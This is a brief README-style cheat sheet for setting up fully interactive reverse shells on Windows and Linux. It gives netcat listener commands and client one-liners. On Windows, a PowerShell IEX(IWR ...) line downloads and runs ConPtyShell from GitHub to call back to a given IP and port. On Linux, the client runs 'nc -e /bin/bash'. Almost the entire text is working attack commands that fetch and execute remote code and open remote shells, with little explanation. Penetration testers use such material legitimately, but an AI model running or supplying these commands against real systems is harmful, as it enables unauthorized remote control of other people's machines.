# Fully-Interactive-Reverse-Shell
## For Windows:

ConPtyShell- a Fully Interactive Reverse Shell for Windows systems.
## Requirements

<p>Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763)</p>
<p>Server Side: any tcp listener, i.e. netcat</p>
#### Via Powershell
## Procedure-
#### Server Side:
```
stty raw -echo; (stty size; cat) | nc -lvnp "port" -s "ip"
```
```
example : stty raw -echo; (stty size; cat) | nc -lvnp 88 -s 10.0.0.2
```
#### Client Side:
```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell "ip" "port"
```
```
example : IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.1 88
```

## For Linux
#### via terminal
## Procedure-
#### Server Side:
```
nc -lnvp "port" -s "ip"
```
#### Client Side:
```
nc -e /bin/bash "ip" "port"
```
